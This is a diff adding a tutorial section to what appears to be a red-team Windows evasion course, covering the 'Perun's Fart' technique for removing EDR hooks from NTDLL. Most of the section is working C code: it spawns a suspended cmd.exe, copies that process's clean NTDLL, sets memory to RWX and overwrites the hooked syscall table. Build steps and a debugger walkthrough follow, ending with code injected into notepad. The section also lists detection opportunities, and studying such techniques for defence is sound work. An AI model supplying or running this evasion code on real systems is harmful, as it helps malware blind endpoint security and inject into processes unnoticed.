@@ -1549,3 +1549,438 @@ Halo's Gate represents a significant evolution in syscall resolution techniques 
 The technique demonstrates that even when security products hook critical functions, the structural relationships between syscalls in memory provide enough information to recover the necessary data for direct system call invocation.
 
 </details>
+
+
+
+<details>
+<summary>06 - Process Unhooking Peruns Fart</summary>
+
+## Overview
+
+Perun's Fart (also known as Parent SVART) is an advanced technique for unhooking NTDLL without reading a fresh copy from disk, which some EDR solutions may flag as suspicious behavior. Instead, it leverages the natural process creation sequence to access a clean version of NTDLL from a suspended process.
+
+## Core Concept: Exploiting Process Creation Timing
+
+[01.Unhooks/05.PerunsFart](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/01.Unhooks/05.PerunsFart)
+
+### The Race Condition Advantage
+
+During normal process creation, there's a critical timing window:
+1. Windows loads NTDLL into the new process
+2. There's a slight delay before AV/EDR solutions inject their monitoring DLLs
+3. By creating processes in suspended mode, we can access clean NTDLL before hooks are installed
+
+### The Suspended Process Strategy
+
+```c
+// Creating Suspended Process
+BOOL success = CreateProcessA(
+    NULL, 
+    (LPSTR)"cmd.exe", 
+    NULL, NULL, FALSE, 
+    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // <-- STEP 1
+    NULL, "C:\\Windows\\System32\\", &si, &pi);
+
+// Extracting Clean NTDLL from Suspended Process
+SIZE_T bytesRead = 0;
+if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
+    printf("Error reading: %d | %x\n", bytesRead, GetLastError());  // <-- STEP 2
+
+// Terminate Suspended Process
+printf("Kill?"); getchar();
+TerminateProcess(pi.hProcess, 0);  // <-- STEP 3
+
+// Unhooking Current Process with Clean NTDLL
+printf("Unhooking ntdll\n");
+ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);  // <-- STEP 4
+
+
+```
+
+## Step-by-Step Implementation
+
+### Step 1: Create Suspended Process
+
+The technique begins by spawning a temporary process in suspended mode:
+
+```c
+BOOL success = CreateProcessA(
+    NULL, 
+    (LPSTR)"cmd.exe", 
+    NULL, 
+    NULL, 
+    FALSE, 
+    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // <-- THIS FLAG CREATES SUSPENDED PROCESS
+    NULL, 
+    "C:\\Windows\\System32\\", 
+    &si, 
+    &pi);
+```
+
+**Why this works:** The `CREATE_SUSPENDED` flag blocks the process from executing, which also prevents security products from injecting their monitoring DLLs until the process is resumed.
+
+### Step 2: Extract Clean NTDLL from Suspended Process
+
+Once we have the suspended process, we extract its clean NTDLL:
+
+```c
+// Get ntdll address and size from current process:
+char * pNtdllAddr = (char *) GetModuleHandle("ntdll.dll");
+IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
+IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
+IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
+SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
+
+// Allocate buffer for the clean copy:
+LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+
+// Extract clean ntdll from SUSPENDED process:
+SIZE_T bytesRead = 0;
+if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
+    printf("Error reading: %d | %x\n", bytesRead, GetLastError());
+```
+
+### Step 3: Terminate Suspended Process
+
+After extracting the clean NTDLL, we no longer need the suspended process:
+```c
+TerminateProcess(pi.hProcess, 0);
+```
+
+### Step 4: Unhook Current Process NTDLL
+
+Now we use the clean copy to unhook our own NTDLL:
+
+```c
+ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
+```
+
+## The Unhooking Process
+
+### Finding the Syscall Table
+
+The key challenge is identifying which parts of NTDLL contain the syscall stubs that need to be restored. The implementation uses two critical functions:
+
+#### Find First Syscall
+
+This function locates the beginning of the syscall table by searching for characteristic patterns:
+
+```c
+static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
+    // ... setup code ...
+    
+    // copy clean "syscall table" into ntdll memory
+    DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+    DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+    
+    if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
+        DWORD SC_size = SC_end - SC_start;
+        // ... copy the syscall table ...
+    }
+    // ... rest of function ...
+}
+```
+
+
+#### Find Last Syscall
+
+Similarly, this function finds the end of the syscall table:
+
+```c
+int FindLastSysCall(char * pMem, DWORD size) {
+
+    // returns the last byte of the last syscall
+    DWORD i;
+    DWORD offset = 0;
+    BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
+    
+    // backwards lookup
+    for (i = size - 9; i > 0; i--) {
+        if (!memcmp(pMem + i, pattern, 9)) {
+            offset = i + 6;
+            printf("Last syscall byte found at 0x%p\n", pMem + offset);
+            break;
+        }
+    }		
+    
+    return offset;
+}
+```
+
+The part responsible for finding the syscall table is the **`UnhookNtdll()` function** which calls two helper functions:
+
+## Main Function - `UnhookNtdll()`:
+```c
+static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
+    // ... setup code ...
+    
+    // copy clean "syscall table" into ntdll memory
+    DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+    DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+    
+    if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
+        DWORD SC_size = SC_end - SC_start;
+        // ... copy the syscall table ...
+    }
+    // ... rest of function ...
+}
+```
+
+**Helper Function 1 - `FindFirstSyscall()`:**
+Finds the **beginning** of the syscall table by searching for:
+- `\x0f\x05\xc3` (syscall + ret instructions)
+- Then backtracks to find `\xcc\xcc\xcc` (int3 padding) which marks the start
+
+**Helper Function 2 - `FindLastSysCall()`:**
+Finds the **end** of the syscall table by searching backwards for:
+- `\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc` (syscall + ret + int 2e + ret + int3 padding)
+
+**The Complete Syscall Table Location Process:**
+1. **`UnhookNtdll()`** orchestrates the process
+2. **`FindFirstSyscall()`** locates the start offset  
+3. **`FindLastSysCall()`** locates the end offset
+4. **`SC_end - SC_start`** calculates the size of the syscall table region
+5. **`memcpy()`** copies this region from clean NTDLL to hooked NTDLL
+
+So **`UnhookNtdll()` is the main function responsible** for finding and copying the syscall table, using the two pattern-matching helper functions to identify the boundaries.
+
+
+### Debugger Analysis: Syscall Table Patterns
+
+<img width="1610" height="801" alt="image" src="https://github.com/user-attachments/assets/5fcc1ab8-80e8-44bd-8edf-f5f728d59fcd" />
+
+Let's examine these patterns in a debugger:
+
+```batch
+Debugger -> Attach -> notepad.exe
+
+Symbols -> Search -> NtAccessCheck
+```
+
+1. **First Syscall Pattern**:
+   - Search for `0F 05 C3` (syscall; ret)
+   - Move backward to find `xcc xcc xcc` (INT3 padding)
+   - This marks the beginning of the syscall table
+
+2. **Last Syscall Pattern**: 
+   - Search for `0F 05 C3 CD` (syscall; ret; int)
+   - This marks the end boundary of the syscall table
+
+ 0F05:
+ 
+<img width="1685" height="817" alt="image" src="https://github.com/user-attachments/assets/46691277-ca4f-401d-8910-c1d04ab29dac" />
+
+Once 0F05 is found we go up until we see CC bytes:
+
+<img width="1684" height="821" alt="image" src="https://github.com/user-attachments/assets/42a36b57-f7d1-478f-a0a2-07ae0fbb21aa" />
+
+If it's found we know that this address is the first byte of the first syscall:
+
+<img width="1675" height="425" alt="image" src="https://github.com/user-attachments/assets/a8305c82-f416-4c54-8eac-14d7e86be59d" />
+
+The second function works similarly but this time were going from the end of ANTDLL and looking this pattern:
+
+```batch
+\x0f\x05\xc3...
+```
+
+<img width="1686" height="595" alt="image" src="https://github.com/user-attachments/assets/59c900e3-41fd-4bde-a697-d7339892d509" />
+
+On the debugger, if we scroll below we will see the end of the syscall table which looks like this:
+
+<img width="1685" height="810" alt="image" src="https://github.com/user-attachments/assets/0e632e7d-a0cb-4c78-8eae-e6ebce93435a" />
+
+
+
+### Memory Protection and Copy Process
+
+Once we have the syscall table boundaries `DWORD SC_start` & `DWORD SC_end`, we calculate the size of it `DWORD SC_size` and crate a copy ` memcpy`. Then finally adjust the protection `oldprotect`:
+
+```c
+// prepare ntdll.dll memory region for write permissions.
+VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                pImgSectionHead->Misc.VirtualSize,
+                PAGE_EXECUTE_READWRITE,  // <-- CHANGE TO RWX
+                &oldprotect);
+if (!oldprotect) {
+    // RWX failed!
+    return -1;
+}
+
+// copy clean "syscall table" into ntdll memory
+DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
+
+if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
+    DWORD SC_size = SC_end - SC_start;
+    printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
+    printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
+    printf("size: %i\n", SC_size);
+    getchar();
+    memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),        // DEST: hooked ntdll
+            (LPVOID)((DWORD_PTR) pCache + SC_start),        // SRC: clean ntdll copy
+            SC_size);                                       // SIZE: syscall table region
+}
+
+// restore original protection settings of ntdll
+VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
+                pImgSectionHead->Misc.VirtualSize,
+                oldprotect,        // <-- RESTORE original protection
+                &oldprotect);
+```
+
+## Practical Demonstration
+
+### Step 1: Compile and Run
+
+```batch
+cd 05.PerunsFart
+compile.bat
+```
+
+Copy the `implant.exe` to test environment folder and rename it as `perun.exe`.
+
+Run `perun.exe`
+
+Attach on Debugger:
+
+<img width="1684" height="809" alt="image" src="https://github.com/user-attachments/assets/a17f936b-e730-4fae-8067-ca9bb82d0fb4" />
+
+msbuild PerunsFart.sln /t:Rebuild /p:Configuration=Release /p:Platform="x64"
+
+### Step 2: Observe Process Creation
+
+When running the executable:
+1. A new `cmd.exe` process is created in suspended state
+   <img width="1678" height="833" alt="image" src="https://github.com/user-attachments/assets/1382e546-208a-46be-beb3-6310cdb85d7c" />
+   
+3. The main thread remains suspended, blocking AV injection
+   <img width="1059" height="774" alt="image" src="https://github.com/user-attachments/assets/854bc8a7-3617-48e7-8b70-29589b7f0bba" />
+
+5. Clean NTDLL is extracted from this process
+   Cache address:
+   <img width="1684" height="379" alt="image" src="https://github.com/user-attachments/assets/891c235d-5988-4840-9784-cdd749c0fa87" />
+
+   CTRL+G and paste:
+   <img width="1680" height="816" alt="image" src="https://github.com/user-attachments/assets/b6f2620f-4d01-4836-81bc-095d0d7372b1" />
+   
+7. The suspended process is terminated
+   <img width="1685" height="695" alt="image" src="https://github.com/user-attachments/assets/82d942a9-f21d-4e6d-889d-8eff3a5a0c61" />
+   <img width="1685" height="570" alt="image" src="https://github.com/user-attachments/assets/32121675-310d-48f2-86ff-fd19ecf7363b" />
+
+
+### Step 3: Verify Unhooking
+
+Were entering the unhookig functions: 
+
+<img width="1375" height="137" alt="image" src="https://github.com/user-attachments/assets/bdb1991f-73dc-4f36-a04f-45c492459bbe" />
+
+First syscall has been found here: 
+
+<img width="1615" height="518" alt="image" src="https://github.com/user-attachments/assets/3ab35293-d56e-4d9a-8436-72fb52a7945b" />
+
+CTRL+G and paste:
+
+<img width="705" height="187" alt="image" src="https://github.com/user-attachments/assets/33aa705a-29bb-4333-956e-3b52f5859263" />
+
+<img width="1607" height="792" alt="image" src="https://github.com/user-attachments/assets/d0e8c845-2160-4a80-b100-ef41b2aa7adb" />
+
+
+The second one (Last syscall byte found):
+
+<img width="1613" height="540" alt="image" src="https://github.com/user-attachments/assets/97265cdb-0f08-49b9-8c60-80078ccdab79" />
+
+<img width="1617" height="658" alt="image" src="https://github.com/user-attachments/assets/4418095e-01c0-477f-b161-5c334e66c9a5" />
+
+
+**Before Unhooking:**
+- `NtCreateThreadEx` shows hooks (starting with `E9` jump instructions)
+- Characteristic syscall bytes are replaced
+ 
+**After Unhooking:**
+- `NtCreateThreadEx` shows clean syscall stub (`4C 8B D1 B8 ...`)
+- All hooked functions are restored to their original state
+
+<img width="1605" height="787" alt="image" src="https://github.com/user-attachments/assets/0852e6ff-434c-4383-8990-7b746344da2a" />
+
+<img width="1608" height="793" alt="image" src="https://github.com/user-attachments/assets/901020fe-7d32-4e92-afdf-3819e8e107ce" />
+
+### Step 4: Execute Payload
+
+Once unhooking is complete:
+- The process can proceed with injection or other operations
+- All NTDLL functions work without AV interference
+- The message box payload executes successfully in the target process
+
+If we hit enter on the cmd and re-analyze:
+
+<img width="1617" height="798" alt="image" src="https://github.com/user-attachments/assets/9836b037-18fd-4ee0-8822-2c51eb79aefe" />
+
+<img width="1607" height="793" alt="image" src="https://github.com/user-attachments/assets/63a8f663-b9fc-4d46-9dd7-40941cf521b8" />
+
+The hook is gone:
+
+<img width="1613" height="780" alt="image" src="https://github.com/user-attachments/assets/655b9e43-ecf2-4bbb-b50f-e2086ee41cfe" />
+
+We can start our notepad.exe, and hit enter on the cmd once more, our code gets injected into our notepad: 
+
+<img width="1363" height="792" alt="image" src="https://github.com/user-attachments/assets/86c9777f-87f2-4ab3-b434-ddee9c91f853" />
+
+## Technical Considerations
+
+### Advantages
+
+1. **No Disk I/O**: Avoids suspicious file reading operations
+2. **No Version Dependency**: Works regardless of Windows version
+3. **Minimal Footprint**: Temporary process is quickly terminated
+4. **Comprehensive Unhooking**: Restores entire syscall table
+
+### Limitations
+
+1. **Process Creation**: May be monitored by advanced EDR solutions
+2. **Suspended Process Detection**: Some security products may flag suspended processes
+3. **Memory Patterns**: Syscall table patterns may change in future Windows versions
+
+### Detection Avoidance
+
+The technique minimizes detection risk by:
+- Using legitimate Windows processes (cmd.exe)
+- Quickly terminating the suspended process
+- Avoiding disk operations
+- Operating entirely in memory
+
+## Comparison with Other Techniques
+
+| Technique | Source of Clean NTDLL | Disk I/O | Complexity |
+|-----------|----------------------|----------|------------|
+| **Disk Reading** | File system | Yes | Low |
+| **Hell's Gate** | N/A (dynamic resolution) | No | Medium |
+| **Halo's Gate** | N/A (neighbor inference) | No | High |
+| **Perun's Fart** | Suspended process | No | Medium |
+
+## Name Origin
+
+The technique's name "Perun's Fart" comes from a word play:
+- "Fart" in Polish means "luck"
+- The technique relies on fortunate timing in process creation
+- Perun is a Slavic god of thunder, symbolizing the powerful but subtle nature of the technique
+
+## Security Implications
+
+### Defensive Applications
+- Red team operations against monitored environments
+- Security product testing and evasion research
+- Malware analysis and detection development
+
+### Detection Opportunities
+- Monitoring for processes created with `CREATE_SUSPENDED` flag
+- Detecting rapid process creation and termination
+- Analyzing memory patching patterns in NTDLL
+
+## Conclusion
+
+Perun's Fart provides an elegant solution to the NTDLL unhooking problem by leveraging Windows' own process creation mechanics. Instead of fighting against security hooks or relying on complex inference algorithms, it simply accesses clean NTDLL from a source that hasn't been contaminated yet—a newly created suspended process.
+
+This technique demonstrates sophisticated understanding of Windows internals and process timing, offering a reliable method for security researchers to operate in hooked environments without triggering disk-based detection mechanisms.
+
+</details>
